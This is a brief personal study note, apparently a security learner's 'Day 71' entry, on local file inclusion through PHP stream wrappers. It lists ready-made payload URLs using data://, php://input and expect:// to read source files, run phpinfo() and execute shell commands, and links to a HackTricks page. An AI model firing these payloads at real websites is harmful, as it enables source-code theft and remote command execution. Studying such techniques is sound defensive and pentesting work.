Daily Notes : Day 71  
Path Traversal -part 2

Data://

http://&lt;domain&gt;.tld/?page=data:text/plain,%3C?php%20echo%20base64_encode(file_get_contents(%22index.php%22));%20?%3E%0Ahttp://example.net/?page=data:text/plain,%3C?php%20phpinfo();%20?%3E

Input://

http://&lt;domain&gt;.com/index.php?page=php://input

Expect://

http://&lt;domain&gt;.com/index.php?page=expect://ls

Many more similar tags can be used !! Tamd a look on common

Check this :

&nbsp;

https://book.hacktricks.xyz/pentesting-web/file-inclusion